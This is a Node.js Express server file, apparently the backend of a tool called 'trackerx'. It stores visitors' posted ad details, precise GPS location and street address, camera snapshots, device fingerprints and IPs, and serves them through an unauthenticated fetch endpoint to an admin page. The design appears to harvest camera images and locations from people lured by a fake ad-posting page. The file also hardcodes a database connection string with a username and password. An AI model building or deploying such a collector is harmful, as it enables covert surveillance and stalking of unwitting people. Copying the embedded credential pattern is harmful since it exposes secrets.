const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 10000;
const MONGODB_URI = "mongodb+srv://mrdev:dev091339@cluster0.grjlq7v.mongodb.net/trackerx?retryWrites=true&w=majority";

app.use(helmet({ contentSecurityPolicy: false }));
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(rateLimit({ windowMs: 15 * 60 * 1000, max: 200 }));
app.use(express.static(__dirname));
app.use(express.static(path.join(__dirname, 'public')));

const captureSchema = new mongoose.Schema({
    id: { type: Number, required: true, unique: true },
    type: { type: String, enum: ['ad_posted', 'permission_granted'], required: true },
    timestamp: { type: Date, default: Date.now },
    ad: { title: String, category: String, description: String, price: String, location: String, phone: String },
    location: { lat: Number, lng: Number, accuracy: Number, street: String, city: String, state: String, country: String, postcode: String, fullAddress: String },
    cameraImage: String,
    device: { userAgent: String, platform: String, language: String, screen: String, timezone: String, ip: String },
    ip: String
}, { timestamps: true });

const Capture = mongoose.model('Capture', captureSchema);

app.post('/api/capture', async (req, res) => {
    try {
        const data = req.body;
        if (!data.id) data.id = Date.now();
        const existing = await Capture.findOne({ id: data.id });
        if (existing) return res.json({ success: true });
        await new Capture(data).save();
        console.log(`✅ Saved: ${data.type} - Camera: ${data.cameraImage ? 'Yes' : 'No'}`);
        res.status(201).json({ success: true });
    } catch (error) {
        console.error('Save error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/api/fetch', async (req, res) => {
    try {
        const records = await Capture.find({}).sort({ timestamp: -1 }).limit(500);
        res.json({ success: true, records });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.delete('/api/delete/:id', async (req, res) => {
    try {
        await Capture.findOneAndDelete({ id: parseInt(req.params.id) });
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false });
    }
});

app.delete('/api/clear', async (req, res) => {
    try {
        await Capture.deleteMany({});
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false });
    }
});

app.get('/', (req, res) => { res.sendFile(path.join(__dirname, 'index.html')); });
app.get('/admin.html', (req, res) => { res.sendFile(path.join(__dirname, 'admin.html')); });

async function startServer() {
    try {
        await mongoose.connect(MONGODB_URI);
        console.log('✅ MongoDB connected');
        app.listen(PORT, '0.0.0.0', () => console.log(`Server running on port ${PORT}`));
    } catch (error) {
        console.error('MongoDB error:', error);
        process.exit(1);
    }
}
startServer();
